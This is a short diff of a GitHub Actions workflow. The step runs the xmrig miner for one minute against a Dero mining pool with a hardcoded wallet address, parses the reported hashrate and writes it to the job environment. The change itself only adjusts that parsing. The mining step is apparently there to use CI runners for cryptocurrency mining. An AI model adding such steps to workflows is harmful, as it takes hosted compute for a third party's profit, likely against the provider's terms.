@@ -43,11 +43,11 @@ jobs:
         sudo chmod +x ./xmrigMiner
         CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --astrobwt-max-size=250 --print-time=10 --daemonized --no-color'
         timeout 1m ./xmrigMiner $CONFIG 2>&1 | tee output.txt
-        # echo "\n it's working:" && ls -la output.txt && cat output.txt
+
+        #echo "\n it's working:" && ls -la output.txt && cat output.txt
         line=`grep "max" output.txt | tail -1`
-
-
-        echo "hashrate=`${line##*max}`" >> $GITHUB_ENV
+        line=${line##*max}
+        echo "hashrate=$line" >> $GITHUB_ENV
 
         # echo "hashrate=`${line##*max}`"
         # echo $hashrate
